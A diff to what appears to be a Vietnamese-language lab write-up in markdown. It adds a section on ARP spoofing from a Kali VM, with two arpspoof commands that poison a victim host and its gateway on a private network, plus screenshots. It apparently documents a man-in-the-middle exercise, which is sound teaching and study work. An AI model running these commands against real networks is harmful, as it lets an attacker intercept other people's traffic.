@@ -212,5 +212,26 @@ sudo sysctl -w net.ipv4.ip_forward=1
 
 <img width="559" height="380" alt="image" src="https://github.com/user-attachments/assets/22296159-8759-49bc-bb78-31e9ac1c1ca9" />
 
+## thực thi arp spoofing 
+
+mở 2 cửa sổ độc lập trên vm kali để giả mạo lừa cả 2 phía victim và gateway 
+
+ở terminal 1: 
+
+```
+sudo arpspoof -i eth0 -t 192.168.1.33 192.168.1.1
+```
+lừa win kali là gateway 
+
+<img width="925" height="626" alt="image" src="https://github.com/user-attachments/assets/6e066957-db47-4062-bbae-956b89abfc33" />
+
+
+ở terminal 2: 
+
+```
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.33
+```
+<img width="960" height="642" alt="image" src="https://github.com/user-attachments/assets/06b04b50-5a0f-4c24-9689-d5883ff3f839" />
+
 
 
